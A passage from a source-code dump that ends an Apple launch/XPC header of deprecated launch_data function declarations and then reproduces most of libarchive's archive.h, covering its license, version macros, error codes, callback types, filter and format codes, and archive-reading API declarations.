OS_EXPORT OS_NONNULL1
bool
launch_data_set_bool(launch_data_t ld, bool val);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_NONNULL1
bool
launch_data_set_real(launch_data_t ld, double val);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_NONNULL1
bool
launch_data_set_string(launch_data_t ld, const char *val);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_NONNULL1
bool
launch_data_set_opaque(launch_data_t ld, const void *bytes, size_t sz);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1
int
launch_data_get_fd(const launch_data_t ld);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1
mach_port_t
launch_data_get_machport(const launch_data_t ld);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1
long long
launch_data_get_integer(const launch_data_t ld);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1
bool
launch_data_get_bool(const launch_data_t ld);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1
double
launch_data_get_real(const launch_data_t ld);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1
const char *
launch_data_get_string(const launch_data_t ld);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1
void * _Nullable
launch_data_get_opaque(const launch_data_t ld);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1
size_t
launch_data_get_opaque_size(const launch_data_t ld);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1
int
launch_data_get_errno(const launch_data_t ld);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT
int
launch_get_fd(void);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_MALLOC OS_WARN_RESULT OS_NONNULL1
launch_data_t
launch_msg(const launch_data_t request);

__END_DECLS
#if __has_feature(assume_nonnull)
_Pragma("clang assume_nonnull end")
#endif

#endif // __XPC_LAUNCH_H__

```

`BaseBin/_external/include/libarchive/archive.h`:

```h
/*-
 * Copyright (c) 2003-2010 Tim Kientzle
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR(S) ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR(S) BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * $FreeBSD: src/lib/libarchive/archive.h.in,v 1.50 2008/05/26 17:00:22 kientzle Exp $
 */

#ifndef ARCHIVE_H_INCLUDED
#define	ARCHIVE_H_INCLUDED

/*
 * The version number is expressed as a single integer that makes it
 * easy to compare versions at build time: for version a.b.c, the
 * version number is printf("%d%03d%03d",a,b,c).  For example, if you
 * know your application requires version 2.12.108 or later, you can
 * assert that ARCHIVE_VERSION_NUMBER >= 2012108.
 */
/* Note: Compiler will complain if this does not match archive_entry.h! */
#define	ARCHIVE_VERSION_NUMBER 3006002

#include <sys/stat.h>
#include <stddef.h>  /* for wchar_t */
#include <stdio.h> /* For FILE * */
#include <time.h> /* For time_t */

/*
 * Note: archive.h is for use outside of libarchive; the configuration
 * headers (config.h, archive_platform.h, etc.) are purely internal.
 * Do NOT use HAVE_XXX configuration macros to control the behavior of
 * this header!  If you must conditionalize, use predefined compiler and/or
 * platform macros.
 */
#if defined(__BORLANDC__) && __BORLANDC__ >= 0x560
# include <stdint.h>
#elif !defined(__WATCOMC__) && !defined(_MSC_VER) && !defined(__INTERIX) && !defined(__BORLANDC__) && !defined(_SCO_DS) && !defined(__osf__) && !defined(__CLANG_INTTYPES_H)
# include <inttypes.h>
#endif

/* Get appropriate definitions of 64-bit integer */
#if !defined(__LA_INT64_T_DEFINED)
/* Older code relied on the __LA_INT64_T macro; after 4.0 we'll switch to the typedef exclusively. */
# if ARCHIVE_VERSION_NUMBER < 4000000
#define __LA_INT64_T la_int64_t
# endif
#define __LA_INT64_T_DEFINED
# if defined(_WIN32) && !defined(__CYGWIN__) && !defined(__WATCOMC__)
typedef __int64 la_int64_t;
# else
# include <unistd.h>  /* ssize_t */
#  if defined(_SCO_DS) || defined(__osf__)
typedef long long la_int64_t;
#  else
typedef int64_t la_int64_t;
#  endif
# endif
#endif

/* The la_ssize_t should match the type used in 'struct stat' */
#if !defined(__LA_SSIZE_T_DEFINED)
/* Older code relied on the __LA_SSIZE_T macro; after 4.0 we'll switch to the typedef exclusively. */
# if ARCHIVE_VERSION_NUMBER < 4000000
#define __LA_SSIZE_T la_ssize_t
# endif
#define __LA_SSIZE_T_DEFINED
# if defined(_WIN32) && !defined(__CYGWIN__) && !defined(__WATCOMC__)
#  if defined(_SSIZE_T_DEFINED) || defined(_SSIZE_T_)
typedef ssize_t la_ssize_t;
#  elif defined(_WIN64)
typedef __int64 la_ssize_t;
#  else
typedef long la_ssize_t;
#  endif
# else
# include <unistd.h>  /* ssize_t */
typedef ssize_t la_ssize_t;
# endif
#endif

/* Large file support for Android */
#if defined(__LIBARCHIVE_BUILD) && defined(__ANDROID__)
#include "android_lf.h"
#endif

/*
 * On Windows, define LIBARCHIVE_STATIC if you're building or using a
 * .lib.  The default here assumes you're building a DLL.  Only
 * libarchive source should ever define __LIBARCHIVE_BUILD.
 */
#if ((defined __WIN32__) || (defined _WIN32) || defined(__CYGWIN__)) && (!defined LIBARCHIVE_STATIC)
# ifdef __LIBARCHIVE_BUILD
#  ifdef __GNUC__
#   define __LA_DECL	__attribute__((dllexport)) extern
#  else
#   define __LA_DECL	__declspec(dllexport)
#  endif
# else
#  ifdef __GNUC__
#   define __LA_DECL
#  else
#   define __LA_DECL	__declspec(dllimport)
#  endif
# endif
#else
/* Static libraries or non-Windows needs no special declaration. */
# define __LA_DECL
#endif

#if defined(__GNUC__) && __GNUC__ >= 3 && !defined(__MINGW32__)
#define	__LA_PRINTF(fmtarg, firstvararg) \
	__attribute__((__format__ (__printf__, fmtarg, firstvararg)))
#else
#define	__LA_PRINTF(fmtarg, firstvararg)	/* nothing */
#endif

#if defined(__GNUC__) && __GNUC__ >= 3 && __GNUC_MINOR__ >= 1
# define __LA_DEPRECATED __attribute__((deprecated))
#else
# define __LA_DEPRECATED
#endif

#ifdef __cplusplus
extern "C" {
#endif

/*
 * The version number is provided as both a macro and a function.
 * The macro identifies the installed header; the function identifies
 * the library version (which may not be the same if you're using a
 * dynamically-linked version of the library).  Of course, if the
 * header and library are very different, you should expect some
 * strangeness.  Don't do that.
 */
__LA_DECL int		archive_version_number(void);

/*
 * Textual name/version of the library, useful for version displays.
 */
#define	ARCHIVE_VERSION_ONLY_STRING "3.6.2dev"
#define	ARCHIVE_VERSION_STRING "libarchive " ARCHIVE_VERSION_ONLY_STRING
__LA_DECL const char *	archive_version_string(void);

/*
 * Detailed textual name/version of the library and its dependencies.
 * This has the form:
 *    "libarchive x.y.z zlib/a.b.c liblzma/d.e.f ... etc ..."
 * the list of libraries described here will vary depending on how
 * libarchive was compiled.
 */
__LA_DECL const char *	archive_version_details(void);

/*
 * Returns NULL if libarchive was compiled without the associated library.
 * Otherwise, returns the version number that libarchive was compiled
 * against.
 */
__LA_DECL const char *  archive_zlib_version(void);
__LA_DECL const char *  archive_liblzma_version(void);
__LA_DECL const char *  archive_bzlib_version(void);
__LA_DECL const char *  archive_liblz4_version(void);
__LA_DECL const char *  archive_libzstd_version(void);

/* Declare our basic types. */
struct archive;
struct archive_entry;

/*
 * Error codes: Use archive_errno() and archive_error_string()
 * to retrieve details.  Unless specified otherwise, all functions
 * that return 'int' use these codes.
 */
#define	ARCHIVE_EOF	  1	/* Found end of archive. */
#define	ARCHIVE_OK	  0	/* Operation was successful. */
#define	ARCHIVE_RETRY	(-10)	/* Retry might succeed. */
#define	ARCHIVE_WARN	(-20)	/* Partial success. */
/* For example, if write_header "fails", then you can't push data. */
#define	ARCHIVE_FAILED	(-25)	/* Current operation cannot complete. */
/* But if write_header is "fatal," then this archive is dead and useless. */
#define	ARCHIVE_FATAL	(-30)	/* No more operations are possible. */

/*
 * As far as possible, archive_errno returns standard platform errno codes.
 * Of course, the details vary by platform, so the actual definitions
 * here are stored in "archive_platform.h".  The symbols are listed here
 * for reference; as a rule, clients should not need to know the exact
 * platform-dependent error code.
 */
/* Unrecognized or invalid file format. */
/* #define	ARCHIVE_ERRNO_FILE_FORMAT */
/* Illegal usage of the library. */
/* #define	ARCHIVE_ERRNO_PROGRAMMER_ERROR */
/* Unknown or unclassified error. */
/* #define	ARCHIVE_ERRNO_MISC */

/*
 * Callbacks are invoked to automatically read/skip/write/open/close the
 * archive. You can provide your own for complex tasks (like breaking
 * archives across multiple tapes) or use standard ones built into the
 * library.
 */

/* Returns pointer and size of next block of data from archive. */
typedef la_ssize_t	archive_read_callback(struct archive *,
				void *_client_data, const void **_buffer);

/* Skips at most request bytes from archive and returns the skipped amount.
 * This may skip fewer bytes than requested; it may even skip zero bytes.
 * If you do skip fewer bytes than requested, libarchive will invoke your
 * read callback and discard data as necessary to make up the full skip.
 */
typedef la_int64_t	archive_skip_callback(struct archive *,
				void *_client_data, la_int64_t request);

/* Seeks to specified location in the file and returns the position.
 * Whence values are SEEK_SET, SEEK_CUR, SEEK_END from stdio.h.
 * Return ARCHIVE_FATAL if the seek fails for any reason.
 */
typedef la_int64_t	archive_seek_callback(struct archive *,
	void *_client_data, la_int64_t offset, int whence);

/* Returns size actually written, zero on EOF, -1 on error. */
typedef la_ssize_t	archive_write_callback(struct archive *,
				void *_client_data,
				const void *_buffer, size_t _length);

typedef int	archive_open_callback(struct archive *, void *_client_data);

typedef int	archive_close_callback(struct archive *, void *_client_data);

typedef int	archive_free_callback(struct archive *, void *_client_data);

/* Switches from one client data object to the next/prev client data object.
 * This is useful for reading from different data blocks such as a set of files
 * that make up one large file.
 */
typedef int archive_switch_callback(struct archive *, void *_client_data1,
				void *_client_data2);

/*
 * Returns a passphrase used for encryption or decryption, NULL on nothing
 * to do and give it up.
 */
typedef const char *archive_passphrase_callback(struct archive *,
				void *_client_data);

/*
 * Codes to identify various stream filters.
 */
#define	ARCHIVE_FILTER_NONE	0
#define	ARCHIVE_FILTER_GZIP	1
#define	ARCHIVE_FILTER_BZIP2	2
#define	ARCHIVE_FILTER_COMPRESS	3
#define	ARCHIVE_FILTER_PROGRAM	4
#define	ARCHIVE_FILTER_LZMA	5
#define	ARCHIVE_FILTER_XZ	6
#define	ARCHIVE_FILTER_UU	7
#define	ARCHIVE_FILTER_RPM	8
#define	ARCHIVE_FILTER_LZIP	9
#define	ARCHIVE_FILTER_LRZIP	10
#define	ARCHIVE_FILTER_LZOP	11
#define	ARCHIVE_FILTER_GRZIP	12
#define	ARCHIVE_FILTER_LZ4	13
#define	ARCHIVE_FILTER_ZSTD	14

#if ARCHIVE_VERSION_NUMBER < 4000000
#define	ARCHIVE_COMPRESSION_NONE	ARCHIVE_FILTER_NONE
#define	ARCHIVE_COMPRESSION_GZIP	ARCHIVE_FILTER_GZIP
#define	ARCHIVE_COMPRESSION_BZIP2	ARCHIVE_FILTER_BZIP2
#define	ARCHIVE_COMPRESSION_COMPRESS	ARCHIVE_FILTER_COMPRESS
#define	ARCHIVE_COMPRESSION_PROGRAM	ARCHIVE_FILTER_PROGRAM
#define	ARCHIVE_COMPRESSION_LZMA	ARCHIVE_FILTER_LZMA
#define	ARCHIVE_COMPRESSION_XZ		ARCHIVE_FILTER_XZ
#define	ARCHIVE_COMPRESSION_UU		ARCHIVE_FILTER_UU
#define	ARCHIVE_COMPRESSION_RPM		ARCHIVE_FILTER_RPM
#define	ARCHIVE_COMPRESSION_LZIP	ARCHIVE_FILTER_LZIP
#define	ARCHIVE_COMPRESSION_LRZIP	ARCHIVE_FILTER_LRZIP
#endif

/*
 * Codes returned by archive_format.
 *
 * Top 16 bits identifies the format family (e.g., "tar"); lower
 * 16 bits indicate the variant.  This is updated by read_next_header.
 * Note that the lower 16 bits will often vary from entry to entry.
 * In some cases, this variation occurs as libarchive learns more about
 * the archive (for example, later entries might utilize extensions that
 * weren't necessary earlier in the archive; in this case, libarchive
 * will change the format code to indicate the extended format that
 * was used).  In other cases, it's because different tools have
 * modified the archive and so different parts of the archive
 * actually have slightly different formats.  (Both tar and cpio store
 * format codes in each entry, so it is quite possible for each
 * entry to be in a different format.)
 */
#define	ARCHIVE_FORMAT_BASE_MASK		0xff0000
#define	ARCHIVE_FORMAT_CPIO			0x10000
#define	ARCHIVE_FORMAT_CPIO_POSIX		(ARCHIVE_FORMAT_CPIO | 1)
#define	ARCHIVE_FORMAT_CPIO_BIN_LE		(ARCHIVE_FORMAT_CPIO | 2)
#define	ARCHIVE_FORMAT_CPIO_BIN_BE		(ARCHIVE_FORMAT_CPIO | 3)
#define	ARCHIVE_FORMAT_CPIO_SVR4_NOCRC		(ARCHIVE_FORMAT_CPIO | 4)
#define	ARCHIVE_FORMAT_CPIO_SVR4_CRC		(ARCHIVE_FORMAT_CPIO | 5)
#define	ARCHIVE_FORMAT_CPIO_AFIO_LARGE		(ARCHIVE_FORMAT_CPIO | 6)
#define	ARCHIVE_FORMAT_CPIO_PWB			(ARCHIVE_FORMAT_CPIO | 7)
#define	ARCHIVE_FORMAT_SHAR			0x20000
#define	ARCHIVE_FORMAT_SHAR_BASE		(ARCHIVE_FORMAT_SHAR | 1)
#define	ARCHIVE_FORMAT_SHAR_DUMP		(ARCHIVE_FORMAT_SHAR | 2)
#define	ARCHIVE_FORMAT_TAR			0x30000
#define	ARCHIVE_FORMAT_TAR_USTAR		(ARCHIVE_FORMAT_TAR | 1)
#define	ARCHIVE_FORMAT_TAR_PAX_INTERCHANGE	(ARCHIVE_FORMAT_TAR | 2)
#define	ARCHIVE_FORMAT_TAR_PAX_RESTRICTED	(ARCHIVE_FORMAT_TAR | 3)
#define	ARCHIVE_FORMAT_TAR_GNUTAR		(ARCHIVE_FORMAT_TAR | 4)
#define	ARCHIVE_FORMAT_ISO9660			0x40000
#define	ARCHIVE_FORMAT_ISO9660_ROCKRIDGE	(ARCHIVE_FORMAT_ISO9660 | 1)
#define	ARCHIVE_FORMAT_ZIP			0x50000
#define	ARCHIVE_FORMAT_EMPTY			0x60000
#define	ARCHIVE_FORMAT_AR			0x70000
#define	ARCHIVE_FORMAT_AR_GNU			(ARCHIVE_FORMAT_AR | 1)
#define	ARCHIVE_FORMAT_AR_BSD			(ARCHIVE_FORMAT_AR | 2)
#define	ARCHIVE_FORMAT_MTREE			0x80000
#define	ARCHIVE_FORMAT_RAW			0x90000
#define	ARCHIVE_FORMAT_XAR			0xA0000
#define	ARCHIVE_FORMAT_LHA			0xB0000
#define	ARCHIVE_FORMAT_CAB			0xC0000
#define	ARCHIVE_FORMAT_RAR			0xD0000
#define	ARCHIVE_FORMAT_7ZIP			0xE0000
#define	ARCHIVE_FORMAT_WARC			0xF0000
#define	ARCHIVE_FORMAT_RAR_V5			0x100000

/*
 * Codes returned by archive_read_format_capabilities().
 *
 * This list can be extended with values between 0 and 0xffff.
 * The original purpose of this list was to let different archive
 * format readers expose their general capabilities in terms of
 * encryption.
 */
#define ARCHIVE_READ_FORMAT_CAPS_NONE (0) /* no special capabilities */
#define ARCHIVE_READ_FORMAT_CAPS_ENCRYPT_DATA (1<<0)  /* reader can detect encrypted data */
#define ARCHIVE_READ_FORMAT_CAPS_ENCRYPT_METADATA (1<<1)  /* reader can detect encryptable metadata (pathname, mtime, etc.) */

/*
 * Codes returned by archive_read_has_encrypted_entries().
 *
 * In case the archive does not support encryption detection at all
 * ARCHIVE_READ_FORMAT_ENCRYPTION_UNSUPPORTED is returned. If the reader
 * for some other reason (e.g. not enough bytes read) cannot say if
 * there are encrypted entries, ARCHIVE_READ_FORMAT_ENCRYPTION_DONT_KNOW
 * is returned.
 */
#define ARCHIVE_READ_FORMAT_ENCRYPTION_UNSUPPORTED -2
#define ARCHIVE_READ_FORMAT_ENCRYPTION_DONT_KNOW -1

/*-
 * Basic outline for reading an archive:
 *   1) Ask archive_read_new for an archive reader object.
 *   2) Update any global properties as appropriate.
 *      In particular, you'll certainly want to call appropriate
 *      archive_read_support_XXX functions.
 *   3) Call archive_read_open_XXX to open the archive
 *   4) Repeatedly call archive_read_next_header to get information about
 *      successive archive entries.  Call archive_read_data to extract
 *      data for entries of interest.
 *   5) Call archive_read_free to end processing.
 */
__LA_DECL struct archive	*archive_read_new(void);

/*
 * The archive_read_support_XXX calls enable auto-detect for this
 * archive handle.  They also link in the necessary support code.
 * For example, if you don't want bzlib linked in, don't invoke
 * support_compression_bzip2().  The "all" functions provide the
 * obvious shorthand.
 */

#if ARCHIVE_VERSION_NUMBER < 4000000
__LA_DECL int archive_read_support_compression_all(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_read_support_compression_bzip2(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_read_support_compression_compress(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_read_support_compression_gzip(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_read_support_compression_lzip(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_read_support_compression_lzma(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_read_support_compression_none(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_read_support_compression_program(struct archive *,
			 const char *command) __LA_DEPRECATED;
__LA_DECL int archive_read_support_compression_program_signature
		(struct archive *, const char *,
		 const void * /* match */, size_t) __LA_DEPRECATED;

__LA_DECL int archive_read_support_compression_rpm(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_read_support_compression_uu(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_read_support_compression_xz(struct archive *)
		__LA_DEPRECATED;
#endif

__LA_DECL int archive_read_support_filter_all(struct archive *);
__LA_DECL int archive_read_support_filter_by_code(struct archive *, int);
__LA_DECL int archive_read_support_filter_bzip2(struct archive *);
__LA_DECL int archive_read_support_filter_compress(struct archive *);
__LA_DECL int archive_read_support_filter_gzip(struct archive *);
__LA_DECL int archive_read_support_filter_grzip(struct archive *);
__LA_DECL int archive_read_support_filter_lrzip(struct archive *);
__LA_DECL int archive_read_support_filter_lz4(struct archive *);
__LA_DECL int archive_read_support_filter_lzip(struct archive *);
__LA_DECL int archive_read_support_filter_lzma(struct archive *);
__LA_DECL int archive_read_support_filter_lzop(struct archive *);
__LA_DECL int archive_read_support_filter_none(struct archive *);
__LA_DECL int archive_read_support_filter_program(struct archive *,
			 const char *command);
__LA_DECL int archive_read_support_filter_program_signature
		(struct archive *, const char * /* cmd */,
					const void * /* match */, size_t);
__LA_DECL int archive_read_support_filter_rpm(struct archive *);
__LA_DECL int archive_read_support_filter_uu(struct archive *);
__LA_DECL int archive_read_support_filter_xz(struct archive *);
__LA_DECL int archive_read_support_filter_zstd(struct archive *);

__LA_DECL int archive_read_support_format_7zip(struct archive *);
__LA_DECL int archive_read_support_format_all(struct archive *);
__LA_DECL int archive_read_support_format_ar(struct archive *);
__LA_DECL int archive_read_support_format_by_code(struct archive *, int);
__LA_DECL int archive_read_support_format_cab(struct archive *);
__LA_DECL int archive_read_support_format_cpio(struct archive *);
__LA_DECL int archive_read_support_format_empty(struct archive *);
__LA_DECL int archive_read_support_format_gnutar(struct archive *);
__LA_DECL int archive_read_support_format_iso9660(struct archive *);
__LA_DECL int archive_read_support_format_lha(struct archive *);
__LA_DECL int archive_read_support_format_mtree(struct archive *);
__LA_DECL int archive_read_support_format_rar(struct archive *);
__LA_DECL int archive_read_support_format_rar5(struct archive *);
__LA_DECL int archive_read_support_format_raw(struct archive *);
__LA_DECL int archive_read_support_format_tar(struct archive *);
__LA_DECL int archive_read_support_format_warc(struct archive *);
__LA_DECL int archive_read_support_format_xar(struct archive *);
/* archive_read_support_format_zip() enables both streamable and seekable
 * zip readers. */
__LA_DECL int archive_read_support_format_zip(struct archive *);
/* Reads Zip archives as stream from beginning to end.  Doesn't
 * correctly handle SFX ZIP files or ZIP archives that have been modified
 * in-place. */
__LA_DECL int archive_read_support_format_zip_streamable(struct archive *);
/* Reads starting from central directory; requires seekable input. */
__LA_DECL int archive_read_support_format_zip_seekable(struct archive *);

/* Functions to manually set the format and filters to be used. This is
 * useful to bypass the bidding process when the format and filters to use
 * is known in advance.
 */
__LA_DECL int archive_read_set_format(struct archive *, int);
__LA_DECL int archive_read_append_filter(struct archive *, int);
__LA_DECL int archive_read_append_filter_program(struct archive *,
	const char *);
__LA_DECL int archive_read_append_filter_program_signature
	(struct archive *, const char *, const void * /* match */, size_t);

/* Set various callbacks. */
__LA_DECL int archive_read_set_open_callback(struct archive *,
	archive_open_callback *);
__LA_DECL int archive_read_set_read_callback(struct archive *,
	archive_read_callback *);
__LA_DECL int archive_read_set_seek_callback(struct archive *,
	archive_seek_callback *);
__LA_DECL int archive_read_set_skip_callback(struct archive *,
	archive_skip_callback *);
__LA_DECL int archive_read_set_close_callback(struct archive *,
	archive_close_callback *);
/* Callback used to switch between one data object to the next */
__LA_DECL int archive_read_set_switch_callback(struct archive *,
	archive_switch_callback *);

/* This sets the first data object. */
__LA_DECL int archive_read_set_callback_data(struct archive *, void *);
/* This sets data object at specified index */
__LA_DECL int archive_read_set_callback_data2(struct archive *, void *,
	unsigned int);
/* This adds a data object at the specified index. */
__LA_DECL int archive_read_add_callback_data(struct archive *, void *,
	unsigned int);
/* This appends a data object to the end of list */
__LA_DECL int archive_read_append_callback_data(struct archive *, void *);
/* This prepends a data object to the beginning of list */
__LA_DECL int archive_read_prepend_callback_data(struct archive *, void *);

/* Opening freezes the callbacks. */
__LA_DECL int archive_read_open1(struct archive *);

/* Convenience wrappers around the above. */
__LA_DECL int archive_read_open(struct archive *, void *_client_data,
			 archive_open_callback *, archive_read_callback *,
			 archive_close_callback *);
__LA_DECL int archive_read_open2(struct archive *, void *_client_data,
			 archive_open_callback *, archive_read_callback *,
			 archive_skip_callback *, archive_close_callback *);

/*
 * A variety of shortcuts that invoke archive_read_open() with
 * canned callbacks suitable for common situations.  The ones that
 * accept a block size handle tape blocking correctly.
 */
/* Use this if you know the filename.  Note: NULL indicates stdin. */
__LA_DECL int archive_read_open_filename(struct archive *,
			 const char *_filename, size_t _block_size);
/* Use this for reading multivolume files by filenames.
 * NOTE: Must be NULL terminated. Sorting is NOT done. */
__LA_DECL int archive_read_open_filenames(struct archive *,
			 const char **_filenames, size_t _block_size);
__LA_DECL int archive_read_open_filename_w(struct archive *,
			 const wchar_t *_filename, size_t _block_size);
/* archive_read_open_file() is a deprecated synonym for ..._open_filename(). */
__LA_DECL int archive_read_open_file(struct archive *,
			 const char *_filename, size_t _block_size) __LA_DEPRECATED;
/* Read an archive that's stored in memory. */
__LA_DECL int archive_read_open_memory(struct archive *,
			 const void * buff, size_t size);
/* A more involved version that is only used for internal testing. */
__LA_DECL int archive_read_open_memory2(struct archive *a, const void *buff,
			 size_t size, size_t read_size);
/* Read an archive that's already open, using the file descriptor. */
__LA_DECL int archive_read_open_fd(struct archive *, int _fd,
			 size_t _block_size);
/* Read an archive that's already open, using a FILE *. */
/* Note: DO NOT use this with tape drives. */
__LA_DECL int archive_read_open_FILE(struct archive *, FILE *_file);

/* Parses and returns next entry header. */
__LA_DECL int archive_read_next_header(struct archive *,
			 struct archive_entry **);

/* Parses and returns next entry header using the archive_entry passed in */
__LA_DECL int archive_read_next_header2(struct archive *,
			 struct archive_entry *);

/*
 * Retrieve the byte offset in UNCOMPRESSED data where last-read
 * header started.
 */
__LA_DECL la_int64_t		 archive_read_header_position(struct archive *);

/*
 * Returns 1 if the archive contains at least one encrypted entry.
 * If the archive format not support encryption at all
 * ARCHIVE_READ_FORMAT_ENCRYPTION_UNSUPPORTED is returned.
 * If for any other reason (e.g. not enough data read so far)
 * we cannot say whether there are encrypted entries, then
 * ARCHIVE_READ_FORMAT_ENCRYPTION_DONT_KNOW is returned.
 * In general, this function will return values below zero when the
 * reader is uncertain or totally incapable of encryption support.
 * When this function returns 0 you can be sure that the reader
 * supports encryption detection but no encrypted entries have
 * been found yet.
 *
 * NOTE: If the metadata/header of an archive is also encrypted, you
 * cannot rely on the number of encrypted entries. That is why this
 * function does not return the number of encrypted entries but#
 * just shows that there are some.
 */
__LA_DECL int	archive_read_has_encrypted_entries(struct archive *);

/*
 * Returns a bitmask of capabilities that are supported by the archive format reader.
 * If the reader has no special capabilities, ARCHIVE_READ_FORMAT_CAPS_NONE is returned.
 */
__LA_DECL int		 archive_read_format_capabilities(struct archive *);

/* Read data from the body of an entry.  Similar to read(2). */
__LA_DECL la_ssize_t		 archive_read_data(struct archive *,
					void *, size_t);

/* Seek within the body of an entry.  Similar to lseek(2). */
__LA_DECL la_int64_t archive_seek_data(struct archive *, la_int64_t, int);

/*
 * A zero-copy version of archive_read_data that also exposes the file offset
 * of each returned block.  Note that the client has no way to specify
 * the desired size of the block.  The API does guarantee that offsets will
 * be strictly increasing and that returned blocks will not overlap.
 */
__LA_DECL int archive_read_data_block(struct archive *a,
			const void **buff, size_t *size, la_int64_t *offset);

/*-
 * Some convenience functions that are built on archive_read_data:
 *  'skip': skips entire entry
 *  'into_buffer': writes data into memory buffer that you provide
 *  'into_fd': writes data to specified filedes
 */
__LA_DECL int archive_read_data_skip(struct archive *);
__LA_DECL int archive_read_data_into_fd(struct archive *, int fd);

/*
 * Set read options.
 */
/* Apply option to the format only. */
__LA_DECL int archive_read_set_format_option(struct archive *_a,
				const char *m, const char *o,
				const char *v);
/* Apply option to the filter only. */
__LA_DECL int archive_read_set_filter_option(struct archive *_a,
				const char *m, const char *o,
				const char *v);
/* Apply option to both the format and the filter. */
__LA_DECL int archive_read_set_option(struct archive *_a,
				const char *m, const char *o,
				const char *v);
/* Apply option string to both the format and the filter. */
__LA_DECL int archive_read_set_options(struct archive *_a,
				const char *opts);

/*
 * Add a decryption passphrase.
 */
__LA_DECL int archive_read_add_passphrase(struct archive *, const char *);
__LA_DECL int archive_read_set_passphrase_callback(struct archive *,
				void *client_data, archive_passphrase_callback *);


/*-
 * Convenience function to recreate the current entry (whose header
 * has just been read) on disk.
 *
 * This does quite a bit more than just copy data to disk. It also:
 *  - Creates intermediate directories as required.
 *  - Manages directory permissions:  non-writable directories will
 *    be initially created with write permission enabled; when the
 *    archive is closed, dir permissions are edited to the values specified
 *    in the archive.
 *  - Checks hardlinks:  hardlinks will not be extracted unless the
 *    linked-to file was also extracted within the same session. (TODO)
 */

/* The "flags" argument selects optional behavior, 'OR' the flags you want. */

/* Default: Do not try to set owner/group. */
#define	ARCHIVE_EXTRACT_OWNER			(0x0001)
/* Default: Do obey umask, do not restore SUID/SGID/SVTX bits. */
#define	ARCHIVE_EXTRACT_PERM			(0x0002)
/* Default: Do not restore mtime/atime. */
#define	ARCHIVE_EXTRACT_TIME			(0x0004)
/* Default: Replace existing files. */
#define	ARCHIVE_EXTRACT_NO_OVERWRITE 		(0x0008)
/* Default: Try create first, unlink only if create fails with EEXIST. */
#define	ARCHIVE_EXTRACT_UNLINK			(0x0010)
/* Default: Do not restore ACLs. */
#define	ARCHIVE_EXTRACT_ACL			(0x0020)
/* Default: Do not restore fflags. */
#define	ARCHIVE_EXTRACT_FFLAGS			(0x0040)
/* Default: Do not restore xattrs. */
